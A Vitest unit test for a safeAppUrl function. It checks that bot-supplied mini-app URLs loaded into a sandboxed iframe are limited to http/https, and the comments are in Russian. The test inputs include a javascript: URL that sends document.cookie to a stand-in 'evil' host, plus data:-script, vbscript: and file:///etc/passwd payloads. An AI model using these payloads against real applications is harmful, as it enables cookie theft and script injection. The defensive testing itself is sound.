import { describe, it, expect } from 'vitest'
import { safeAppUrl } from './WebAppModal'

// SEC-1: URL mini-app контролирует бот и идёт в src iframe (sandbox с
// allow-same-origin). Разрешаем только http/https; всё остальное — about:blank,
// иначе javascript:/data: исполнились бы в origin приложения.
describe('safeAppUrl', () => {
  it('пропускает http/https без изменений', () => {
    expect(safeAppUrl('https://app.example/mini')).toBe('https://app.example/mini')
    expect(safeAppUrl('http://app.example/x?y=1')).toBe('http://app.example/x?y=1')
  })

  it('блокирует javascript:/data:/прочие схемы → about:blank', () => {
    expect(safeAppUrl('javascript:fetch("//evil/"+document.cookie)')).toBe('about:blank')
    expect(safeAppUrl('data:text/html,<script>alert(1)</script>')).toBe('about:blank')
    expect(safeAppUrl('vbscript:msgbox(1)')).toBe('about:blank')
    expect(safeAppUrl('file:///etc/passwd')).toBe('about:blank')
    expect(safeAppUrl('tg://resolve?domain=x')).toBe('about:blank')
  })

  it('невалидный URL → about:blank', () => {
    expect(safeAppUrl('')).toBe('about:blank')
    expect(safeAppUrl('   ')).toBe('about:blank')
    expect(safeAppUrl('http://')).toBe('about:blank')
  })

  it('регистр схемы не обходит фильтр', () => {
    expect(safeAppUrl('JavaScript:alert(1)')).toBe('about:blank')
  })
})
